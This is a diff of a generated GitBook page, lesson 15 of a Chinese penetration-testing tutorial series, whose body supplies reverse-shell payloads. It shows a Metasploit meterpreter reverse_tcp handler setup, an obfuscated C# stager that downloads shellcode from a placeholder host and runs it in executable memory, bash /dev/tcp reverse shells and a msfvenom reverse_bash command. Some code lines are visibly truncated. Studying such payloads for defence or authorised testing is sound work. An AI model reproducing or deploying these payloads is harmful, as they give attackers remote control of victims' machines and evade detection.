@@ -1,14 +1,14 @@
 
 <!DOCTYPE HTML>
-<html lang="" >
+<html lang="zh-hans" >
     <head>
         <meta charset="UTF-8">
         <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
-        <title>第十五课：基于第十课补充payload2 · GitBook</title>
+        <title>第十五课：基于第十课补充payload2 · Micro8 系列教程</title>
         <meta http-equiv="X-UA-Compatible" content="IE=edge" />
         <meta name="description" content="">
         <meta name="generator" content="GitBook 3.2.3">
-        
+        <meta name="author" content="Micro8 系列作者">
         
         
     
@@ -17,17 +17,33 @@
     
             
                 
-                <link rel="stylesheet" href="../gitbook/gitbook-plugin-highlight/website.css">
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-search-plus/search.css">
                 
             
                 
-                <link rel="stylesheet" href="../gitbook/gitbook-plugin-search/search.css">
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-prism/prism-darcula.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-splitter/splitter.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-tbfed-pagefooter/footer.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-donate/plugin.css">
                 
             
                 
                 <link rel="stylesheet" href="../gitbook/gitbook-plugin-fontsettings/website.css">
                 
             
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-theme-comscore/test.css">
+                
+            
         
 
     
@@ -47,6 +63,7 @@
     
 
         
+    
     
     
     <meta name="HandheldFriendly" content="true"/>
@@ -63,6 +80,17 @@
     <link rel="prev" href="14_基于第十课补充payload1.html" />
     
 
+    <style>
+    @media only screen and (max-width: 640px) {
+        .book-header .hidden-mobile {
+            display: none;
+        }
+    }
+    </style>
+    <script>
+        window["gitbook-plugin-github-buttons"] = {"repo":"https://github.com/Micropoor/Micro8","types":["star","watch","fork"],"size":"small"};
+    </script>
+
     </head>
     <body>
         
@@ -71,7 +99,7 @@
         
             
 <div id="book-search-input" role="search">
-    <input type="text" placeholder="Type to search" />
+    <input type="text" placeholder="输入并搜索" />
 </div>
 
             
@@ -82,7 +110,21 @@
 <ul class="summary">
     
     
+    
+        
+        <li>
+            <a href="https://micropoor.blogspot.com" target="_blank" class="custom-link">Micropoor</a>
+        </li>
+    
+        
+        <li>
+            <a href="https://github.com/micro8" target="_blank" class="custom-link">Github Micro8</a>
+        </li>
+    
+    
 
+    
+    <li class="divider"></li>
     
 
     
@@ -1785,7 +1827,7 @@
 
     <li>
         <a href="https://www.gitbook.com" target="blank" class="gitbook-link">
-            Published with GitBook
+            本书使用 GitBook 发布
         </a>
     </li>
 </ul>
@@ -1818,7 +1860,7 @@
                     <div class="page-wrapper" tabindex="-1" role="main">
                         <div class="page-inner">
                             
-<div id="book-search-results">
+<div class="search-plus" id="book-search-results">
     <div class="search-noresults">
     
                                 <section class="normal markdown-section">
@@ -1827,68 +1869,70 @@
 <p>&#x8FD9;&#x6B21;&#x4E3B;&#x8981;&#x8865;&#x5145;&#x4E86; C#&#xFF0C;Bash</p>
 <p>ps:&#x5728;&#x7EBF;&#x4EE3;&#x7801;&#x9AD8;&#x4EAE;&#xFF1A;<a href="http://tool.oschina.net/highlight" target="_blank">http://tool.oschina.net/highlight</a></p>
 <h3 id="1&#x3001;c-payload">1&#x3001;C#-payload</h3>
-<pre><code class="lang-bash">msf &gt; use exploit/multi/handler
-msf exploit(handler) &gt; <span class="hljs-built_in">set</span> payload windows/meterpreter/reverse_tcp 
-payload =&gt; windows/meterpreter/reverse_tcp
-msf exploit(handler) &gt; <span class="hljs-built_in">set</span> LHOST 192.168.1.107
-LHOST =&gt; 192.168.1.107
+<pre class="language-"><code class="lang-bash">msf <span class="token operator">&gt;</span> use exploit/multi/handler
+msf exploit<span class="token punctuation">(</span>handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token keyword">set</span> payload windows/meterpreter/reverse_tcp 
+payload <span class="token operator">=</span><span class="token operator">&gt;</span> windows/meterpreter/reverse_tcp
+msf exploit<span class="token punctuation">(</span>handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token keyword">set</span> LHOST 192.168.1.107
+LHOST <span class="token operator">=</span><span class="token operator">&gt;</span> 192.168.1.107
 </code></pre>
 <p>&#x6DF7;&#x6DC6;&#xFF1A;</p>
-<pre><code class="lang-c#">using System&#x37E; using System.Net&#x37E; using System.Net.Sockets&#x37E; using System.Runtime.InteropServices&#x37E; using System.
-namespace RkfCHtll { class LiNGeDokqnEH {
-static byte[] idCWVw(string VVUUJUQytjlL, int eMcukOUqFuHbUv) {
-    IPEndPoint nlttgWAMdEQgAo = new IPEndPoint(IPAddress.Parse(VVUUJUQytjlL),
-eMcukOUqFuHbUv)&#x37E; 
-    Socket fzTiwdk = new Socket(AddressFamily.InterNetwork,
-SocketType.Stream, ProtocolType.Tcp)&#x37E; 
-    try { fzTiwdk.Connect(nlttgWAMdEQgAo)&#x37E;}
-    catch { return null&#x37E;}
-    byte[] gJVVagJmu = new byte[4]&#x37E;
-    fzTiwdk.Receive(gJVVagJmu, 4, 0)&#x37E;
-    int GFxHorfhzft = BitConverter.ToInt32(gJVVagJmu, 0)&#x37E;
-    byte[] mwxyRsYNn = new byte[GFxHorfhzft + 5]&#x37E; 
-    int yVcZAEmXaMszAc = 0&#x37E;
-    while (yVcZAEmXaMszAc &lt; GFxHorfhzft)
-    { yVcZAEmXaMszAc += fzTiwdk.Receive(mwxyRsYNn,yVcZAEmXaMszAc + 5, (GFxHorfhzft - yVcZAEmXaMszAc) &lt; 4096 
-    byte[] XEvFDc = BitConverter.GetBytes((int)fzTiwdk.Handle)&#x37E;
-    Array.Copy(XEvFDc, 0, mwxyRsYNn, 1, 4)&#x37E; mwxyRsYNn[0] = 0xBF&#x37E;
-    return mwxyRsYNn&#x37E;}
-static void hcvPkmyIZ(byte[] fPnfqu) {
-    if (fPnfqu != null) {
-        UInt32 hcoGPUltNcjK = VirtualAlloc(0,(UInt32)fPnfqu.Length, 0x1000, 0x40)&#x37E;
-        Marshal.Copy(fPnfqu, 0, (IntPtr)(hcoGPUltNcjK), fPnfqu.Length)&#x37E;
-        IntPtr xOxEPnqW = IntPtr.Zero&#x37E; 
-        UInt32 ooiiZLMzO = 0&#x37E;
-        IntPtr wxPyud = IntPtr.Zero&#x37E;
-        xOxEPnqW = CreateThread(0, 0, hcoGPUltNcjK, wxPyud, 0, ref ooiiZLMzO)&#x37E;
-        WaitForSingleObject(xOxEPnqW, 0xFFFFFFFF)&#x37E; }}
-static void Main(){
-    byte[] dCwAid = null&#x37E; dCwAid = idCWVw(&quot;xx.xx.xx.xx&quot;, xx)&#x37E;
-    hcvPkmyIZ(dCwAid)&#x37E; }
-        [DllImport(&quot;kernel32&quot;)] private static extern UInt32 VirtualAlloc(UInt32 qWBbOS,UInt32 HoKzSHMU, UInt [DllImport(&quot;kernel32&quot;)]private static extern
-IntPtr CreateThread(UInt32 tqUXybrozZ, UInt32 FMmVpwin, UInt32 H
-[DllImport(&quot;kernel32&quot;)] private static extern UInt32
-WaitForSingleObject(IntPtr CApwDwK, UInt32 uzGJUddCYTd)&#x37E;
+<pre class="language-"><code class="lang-csharp"><span class="token keyword">using</span> System&#x37E; <span class="token keyword">using</span> System<span class="token punctuation">.</span>Net&#x37E; <span class="token keyword">using</span> System<span class="token punctuation">.</span>Net<span class="token punctuation">.</span>Sockets&#x37E; <span class="token keyword">using</span> System<span class="token punctuation">.</span>Runtime<span class="token punctuation">.</span>InteropServices&#x37E; <span class="token keyword">using</span> System<span class="token punctuation">.</span>
+<span class="token keyword">namespace</span> RkfCHtll <span class="token punctuation">{</span> <span class="token keyword">class</span> <span class="token class-name">LiNGeDokqnEH</span> <span class="token punctuation">{</span>
+<span class="token keyword">static</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">idCWVw</span><span class="token punctuation">(</span><span class="token keyword">string</span> VVUUJUQytjlL<span class="token punctuation">,</span> <span class="token keyword">int</span> eMcukOUqFuHbUv<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token class-name">IPEndPoint</span> nlttgWAMdEQgAo <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">IPEndPoint</span><span class="token punctuation">(</span>IPAddress<span class="token punctuation">.</span><span class="token function">Parse</span><span class="token punctuation">(</span>VVUUJUQytjlL<span class="token punctuation">)</span><span class="token punctuation">,</span>
+eMcukOUqFuHbUv<span class="token punctuation">)</span>&#x37E; 
+    <span class="token class-name">Socket</span> fzTiwdk <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Socket</span><span class="token punctuation">(</span>AddressFamily<span class="token punctuation">.</span>InterNetwork<span class="token punctuation">,</span>
+SocketType<span class="token punctuation">.</span>Stream<span class="token punctuation">,</span> ProtocolType<span class="token punctuation">.</span>Tcp<span class="token punctuation">)</span>&#x37E; 
+    <span class="token keyword">try</span> <span class="token punctuation">{</span> fzTiwdk<span class="token punctuation">.</span><span class="token function">Connect</span><span class="token punctuation">(</span>nlttgWAMdEQgAo<span class="token punctuation">)</span>&#x37E;<span class="token punctuation">}</span>
+    <span class="token keyword">catch</span> <span class="token punctuation">{</span> <span class="token keyword">return</span> <span class="token keyword">null</span>&#x37E;<span class="token punctuation">}</span>
+    <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> gJVVagJmu <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span>&#x37E;
+    fzTiwdk<span class="token punctuation">.</span><span class="token function">Receive</span><span class="token punctuation">(</span>gJVVagJmu<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>&#x37E;
+    <span class="token keyword">int</span> GFxHorfhzft <span class="token operator">=</span> BitConverter<span class="token punctuation">.</span><span class="token function">ToInt32</span><span class="token punctuation">(</span>gJVVagJmu<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>&#x37E;
+    <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> mwxyRsYNn <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token class-name">GFxHorfhzft</span> <span class="token operator">+</span> <span class="token number">5</span><span class="token punctuation">]</span>&#x37E; 
+    <span class="token keyword">int</span> yVcZAEmXaMszAc <span class="token operator">=</span> <span class="token number">0</span>&#x37E;
+    <span class="token keyword">while</span> <span class="token punctuation">(</span>yVcZAEmXaMszAc <span class="token operator">&lt;</span> GFxHorfhzft<span class="token punctuation">)</span>
+    <span class="token punctuation">{</span> yVcZAEmXaMszAc <span class="token operator">+</span><span class="token operator">=</span> fzTiwdk<span class="token punctuation">.</span><span class="token function">Receive</span><span class="token punctuation">(</span>mwxyRsYNn<span class="token punctuation">,</span>yVcZAEmXaMszAc <span class="token operator">+</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>GFxHorfhzft <span class="token operator">-</span> yVcZAEmXaMszAc<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">4096</span> 
+    <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> XEvFDc <span class="token operator">=</span> BitConverter<span class="token punctuation">.</span><span class="token function">GetBytes</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>fzTiwdk<span class="token punctuation">.</span>Handle<span class="token punctuation">)</span>&#x37E;
+    Array<span class="token punctuation">.</span><span class="token function">Copy</span><span class="token punctuation">(</span>XEvFDc<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> mwxyRsYNn<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span>&#x37E; mwxyRsYNn<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xBF</span>&#x37E;
+    <span class="token keyword">return</span> mwxyRsYNn&#x37E;<span class="token punctuation">}</span>
+<span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">hcvPkmyIZ</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> fPnfqu<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>fPnfqu <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token class-name">UInt32</span> hcoGPUltNcjK <span class="token operator">=</span> <span class="token function">VirtualAlloc</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token punctuation">(</span>UInt32<span class="token punctuation">)</span>fPnfqu<span class="token punctuation">.</span>Length<span class="token punctuation">,</span> <span class="token number">0x1000</span><span class="token punctuation">,</span> <span class="token number">0x40</span><span class="token punctuation">)</span>&#x37E;
+        Marshal<span class="token punctuation">.</span><span class="token function">Copy</span><span class="token punctuation">(</span>fPnfqu<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>IntPtr<span class="token punctuation">)</span><span class="token punctuation">(</span>hcoGPUltNcjK<span class="token punctuation">)</span><span class="token punctuation">,</span> fPnfqu<span class="token punctuation">.</span>Length<span class="token punctuation">)</span>&#x37E;
+        <span class="token class-name">IntPtr</span> xOxEPnqW <span class="token operator">=</span> IntPtr<span class="token punctuation">.</span>Zero&#x37E; 
+        <span class="token class-name">UInt32</span> ooiiZLMzO <span class="token operator">=</span> <span class="token number">0</span>&#x37E;
+        <span class="token class-name">IntPtr</span> wxPyud <span class="token operator">=</span> IntPtr<span class="token punctuation">.</span>Zero&#x37E;
+        xOxEPnqW <span class="token operator">=</span> <span class="token function">CreateThread</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> hcoGPUltNcjK<span class="token punctuation">,</span> wxPyud<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">ref</span> ooiiZLMzO<span class="token punctuation">)</span>&#x37E;
+        <span class="token function">WaitForSingleObject</span><span class="token punctuation">(</span>xOxEPnqW<span class="token punctuation">,</span> <span class="token number">0xFFFFFFFF</span><span class="token punctuation">)</span>&#x37E; <span class="token punctuation">}</span><span class="token punctuation">}</span>
+<span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">Main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> dCwAid <span class="token operator">=</span> <span class="token keyword">null</span>&#x37E; dCwAid <span class="token operator">=</span> <span class="token function">idCWVw</span><span class="token punctuation">(</span><span class="token string">&quot;xx.xx.xx.xx&quot;</span><span class="token punctuation">,</span> xx<span class="token punctuation">)</span>&#x37E;
+    <span class="token function">hcvPkmyIZ</span><span class="token punctuation">(</span>dCwAid<span class="token punctuation">)</span>&#x37E; <span class="token punctuation">}</span>
+        <span class="token punctuation">[</span><span class="token class-name">DllImport</span><span class="token punctuation">(</span><span class="token string">&quot;kernel32&quot;</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">extern</span> <span class="token class-name">UInt32</span> <span class="token function">VirtualAlloc</span><span class="token punctuation">(</span><span class="token class-name">UInt32</span> qWBbOS<span class="token punctuation">,</span><span class="token class-name">UInt32</span> HoKzSHMU<span class="token punctuation">,</span> UInt <span class="token punctuation">[</span><span class="token class-name">DllImport</span><span class="token punctuation">(</span><span class="token string">&quot;kernel32&quot;</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">extern</span>
+<span class="token class-name">IntPtr</span> <span class="token function">CreateThread</span><span class="token punctuation">(</span><span class="token class-name">UInt32</span> tqUXybrozZ<span class="token punctuation">,</span> <span class="token class-name">UInt32</span> FMmVpwin<span class="token punctuation">,</span> <span class="token class-name">UInt32</span> H
+<span class="token punctuation">[</span><span class="token class-name">DllImport</span><span class="token punctuation">(</span><span class="token string">&quot;kernel32&quot;</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">extern</span> <span class="token class-name">UInt32</span>
+<span class="token function">WaitForSingleObject</span><span class="token punctuation">(</span><span class="token class-name">IntPtr</span> CApwDwK<span class="token punctuation">,</span> <span class="token class-name">UInt32</span> uzGJUddCYTd<span class="token punctuation">)</span>&#x37E;
 </code></pre>
 <p><img src="media/926b5570b97743dcfdc212edb6604589.jpg" alt=""></p>
 <h3 id="2&#x3001;bash-payload">2&#x3001;Bash-payload</h3>
-<pre><code class="lang-bash">i &gt;&amp; /dev/tcp/xx.xx.xx.xx/xx 0&gt;&amp;1
+<pre class="language-"><code class="lang-bash">i <span class="token operator">&gt;</span><span class="token operator">&amp;</span> /dev/tcp/xx.xx.xx.xx/xx 0<span class="token operator">&gt;</span><span class="token operator">&amp;</span>1
 </code></pre>
 <p><img src="media/49ee03061e17179d4022d4fc02df4da6.jpg" alt="">  </p>
-<pre><code class="lang-bash"><span class="hljs-built_in">exec</span> 5&lt;&gt;/dev/tcp/xx.xx.xx.xx/xx
-cat &lt;&amp;5 | <span class="hljs-keyword">while</span> <span class="hljs-built_in">read</span> line&#x37E; <span class="hljs-keyword">do</span> <span class="hljs-variable">$line</span> 2&gt;&amp;5 &gt;&amp;5&#x37E;<span class="hljs-keyword">done</span>
+<pre class="language-"><code class="lang-bash"><span class="token function">exec</span> 5<span class="token operator">&lt;</span><span class="token operator">&gt;</span>/dev/tcp/xx.xx.xx.xx/xx
+<span class="token function">cat</span> <span class="token operator">&lt;</span><span class="token operator">&amp;</span>5 <span class="token operator">|</span> <span class="token keyword">while</span> <span class="token function">read</span> line&#x37E; <span class="token keyword">do</span> <span class="token variable">$line</span> 2<span class="token operator">&gt;</span><span class="token operator">&amp;</span>5 <span class="token operator">&gt;</span><span class="token operator">&amp;</span>5&#x37E;done
 </code></pre>
 <p><img src="media/9b61ec08224188e6d2e172a47df7861a.jpg" alt=""></p>
 <h3 id="&#x9644;&#x5F55;&#xFF1A;">&#x9644;&#x5F55;&#xFF1A;</h3>
 <p>msfvenom &#x751F;&#x6210; bash</p>
-<pre><code class="lang-bash">root@John:~<span class="hljs-comment"># msfvenom -p cmd/unix/reverse_bash LHOST=xx.xx..xx.xx LPORT=xx &gt; -f raw &gt; payload.sh</span>
+<pre class="language-"><code class="lang-bash">root@John:~<span class="token comment"># msfvenom -p cmd/unix/reverse_bash LHOST=xx.xx..xx.xx LPORT=xx &gt; -f raw &gt; payload.sh</span>
 </code></pre>
 <p>&#x53C2;&#x6570;&#x7B80;&#x5316;
 &#x9879;&#x76EE;&#x5730;&#x5740;&#xFF1A;<br><a href="https://github.com/g0tmi1k/mpc" target="_blank">https://github.com/g0tmi1k/mpc</a><br><img src="media/4b4fa44f7174bc8361028253fefead0e.jpg" alt=""></p>
 <blockquote>
 <p>  Micropoor</p>
 </blockquote>
-
+<footer class="page-footer"><span class="copyright">Copyright &#xA9; Micro8 2018 all right reserved&#xFF0C;powered by Gitbook</span><span class="footer-modification">&#x4FEE;&#x8BA2;&#x65F6;&#x95F4;&#xFF1A;
+2019-02-25 20:31
+</span></footer>
                                 
                                 </section>
                             
@@ -1931,7 +1975,7 @@ cat &lt;&amp;5 | <span class="hljs-keyword">while</span> <span class="hljs-built
     <script>
         var gitbook = gitbook || [];
         gitbook.push(function() {
-            gitbook.page.hasChanged({"page":{"title":"第十五课：基于第十课补充payload2","level":"1.4.15","depth":2,"next":{"title":"第十六课：红蓝对抗渗透测试1","level":"1.4.16","depth":2,"path":"Chapter1/16_红蓝对抗渗透测试1.md","ref":"Chapter1/16_红蓝对抗渗透测试1.md","articles":[]},"previous":{"title":"第十四课：基于第十课补充payload1","level":"1.4.14","depth":2,"path":"Chapter1/14_基于第十课补充payload1.md","ref":"Chapter1/14_基于第十课补充payload1.md","articles":[]},"dir":"ltr"},"config":{"gitbook":"*","theme":"default","variables":{},"plugins":[],"pluginsConfig":{"highlight":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"}},"file":{"path":"Chapter1/15_基于第十课补充payload2.md","mtime":"2019-02-23T07:58:38.706Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2019-02-25T04:00:06.266Z"},"basePath":"..","book":{"language":""}});
+            gitbook.page.hasChanged({"page":{"title":"第十五课：基于第十课补充payload2","level":"1.4.15","depth":2,"next":{"title":"第十六课：红蓝对抗渗透测试1","level":"1.4.16","depth":2,"path":"Chapter1/16_红蓝对抗渗透测试1.md","ref":"Chapter1/16_红蓝对抗渗透测试1.md","articles":[]},"previous":{"title":"第十四课：基于第十课补充payload1","level":"1.4.14","depth":2,"path":"Chapter1/14_基于第十课补充payload1.md","ref":"Chapter1/14_基于第十课补充payload1.md","articles":[]},"dir":"ltr"},"config":{"plugins":["-lunr","-search","search-plus","-highlight","prism","theme-comscore","splitter","-sharing","sharing-plus","-expandable-chapters-small","simple-page-toc","github","github-buttons","tbfed-pagefooter","donate","ga"],"root":".","styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"tbfed-pagefooter":{"copyright":"Copyright © Micro8 2018","modify_label":"修订时间：","modify_format":"YYYY-MM-DD HH:mm"},"prism":{"css":["prism-themes/themes/prism-darcula.css"]},"github":{"url":"https://github.com/micro8"},"simple-page-toc":{"maxDepth":3,"skipFirstH1":true},"splitter":{},"sharing-plus":{"qq":false,"all":["facebook","google","twitter","instapaper","linkedin","pocket","stumbleupon"],"douban":false,"facebook":true,"weibo":false,"instapaper":false,"whatsapp":false,"hatenaBookmark":false,"twitter":true,"messenger":false,"line":false,"vk":false,"pocket":true,"google":false,"viber":false,"stumbleupon":false,"qzone":false,"linkedin":false},"donate":{"alipay":"","alipayText":"支付宝打赏","button":"赞赏码","title":"有读者问赞赏码，如下，自愿：","wechat":"./dashang.png","wechatText":""},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-comscore":{},"github-buttons":{"repo":"https://github.com/Micropoor/Micro8","types":["star","watch","fork"],"size":"small"},"ga":{"configuration":"auto","token":"UA-135003278-1"},"sharing":{"qq":false,"all":["facebook","google","twitter","weibo","instapaper","linkedin","pocket","stumbleupon"],"douban":false,"facebook":false,"weibo":false,"instapaper":false,"whatsapp":false,"hatenaBookmark":false,"twitter":false,"messenger":false,"line":false,"vk":false,"pocket":false,"google":false,"viber":false,"stumbleupon":false,"qzone":false,"linkedin":false},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false},"search-plus":{}},"theme":"default","author":"Micro8 系列作者","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{},"title":"Micro8 系列教程","language":"zh-hans","links":{"sidebar":{"Micropoor":"https://micropoor.blogspot.com","Github Micro8":"https://github.com/micro8"}},"gitbook":"*","description":"Micro8"},"file":{"path":"Chapter1/15_基于第十课补充payload2.md","mtime":"2019-02-25T12:31:34.273Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2019-02-25T13:55:17.972Z"},"basePath":"..","book":{"language":""}});
         });
     </script>
 </div>
@@ -1941,27 +1985,43 @@ cat &lt;&amp;5 | <span class="hljs-keyword">while</span> <span class="hljs-built
     <script src="../gitbook/theme.js"></script>
     
         
-        <script src="../gitbook/gitbook-plugin-search/search-engine.js"></script>
+        <script src="../gitbook/gitbook-plugin-search-plus/jquery.mark.min.js"></script>
         
     
         
-        <script src="../gitbook/gitbook-plugin-search/search.js"></script>
+        <script src="../gitbook/gitbook-plugin-search-plus/search.js"></script>
         
     
         
-        <script src="../gitbook/gitbook-plugin-lunr/lunr.min.js"></script>
+        <script src="../gitbook/gitbook-plugin-splitter/splitter.js"></script>
         
     
         
-        <script src="../gitbook/gitbook-plugin-lunr/search-lunr.js"></script>
+        <script src="../gitbook/gitbook-plugin-sharing-plus/buttons.js"></script>
         
     
         
-        <script src="../gitbook/gitbook-plugin-sharing/buttons.js"></script>
+        <script src="../gitbook/gitbook-plugin-github/plugin.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-github-buttons/plugin.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-donate/plugin.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-ga/plugin.js"></script>
         
     
         
         <script src="../gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-theme-comscore/test.js"></script>
         
     
 
